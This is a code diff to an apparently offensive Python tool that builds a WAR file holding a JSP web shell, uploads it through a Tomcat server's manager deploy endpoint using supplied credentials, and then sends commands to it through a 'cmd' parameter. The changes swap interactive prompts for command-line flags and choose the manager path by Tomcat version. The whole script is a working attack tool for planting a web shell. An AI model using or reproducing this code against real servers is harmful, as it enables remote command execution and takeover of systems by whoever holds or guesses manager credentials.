@@ -3,7 +3,7 @@ import base64
 import os
 from bs4 import BeautifulSoup
 import time
-#Beta 7/27/2021
+import argparse
 
 def shell(url):
     url = url + "webshell/index.jsp?cmd="
@@ -36,10 +36,10 @@ def war(url,path,encoded):
     encoded = "Basic " + encoded
     header = {"Authorization": encoded, "Content-Type": "application/octet-stream"} 
     
-    urlw = url + path + "text/undeploy?path=/webshell" 
+    urlw = url + path + "undeploy?path=/webshell" 
     wr = requests.put(urlw,headers=header,data=data, verify=False)
 
-    urlw = url + path + "text/deploy?path=/webshell" 
+    urlw = url + path + "deploy?path=/webshell" 
     wr = requests.put(urlw,headers=header,data=data, verify=False)
 
     if wr.status_code == 200:
@@ -49,7 +49,7 @@ def war(url,path,encoded):
     else:
         print("Unable to upload file!")
         time.sleep(1)
-        main()
+        exit()
     
 
 def encode(url,path,user,password):
@@ -64,28 +64,31 @@ def encode(url,path,user,password):
 def payload_w(url,path,user,password):
     print("Building WAR file")
     time.sleep(1) 
-    os.system("jar -cvf webshell.war index.jsp") 
+    os.system("jar -cvf webshell.war index.jsp")  
     
     encode(url,path,user,password)
 
 def main():
+    parser = argparse.ArgumentParser(description='Tomcat WAR File Upload')
+
+    parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://tomcatsite.blah/', required=True)
+    parser.add_argument('-u', metavar='<username>', help='Username', required=True)
+    parser.add_argument('-p', metavar='<password>', help='Password', required=True)
+    parser.add_argument('--version', metavar='<version>', help='The tomcat version E.G --version 8', required=True)
+    args = parser.parse_args()
+
+    url = args.t
+    user = args.u
+    password = args.p
+    ver = args.version
+    if ver >= '7': 
+        path = '/manager/text/'
+    else:
+        path = '/manager/'
+
     print("Welcome to WAR tomcat file uploader!")
     time.sleep(1)
-    while True:
-        try:
-            url = input("Enter url: ")
 
-            print("Enter manager path ( E.G /manager/ )")
-            path = input("Path: ")
-
-            user = input("Enter username: ")
-
-            password = input("Enter password: ")
-
-            payload_w(url,path,user,password)
-
-        except KeyboardInterrupt:
-            print("Bye Bye!")
-            exit()
+    payload_w(url,path,user,password)
 
 main()
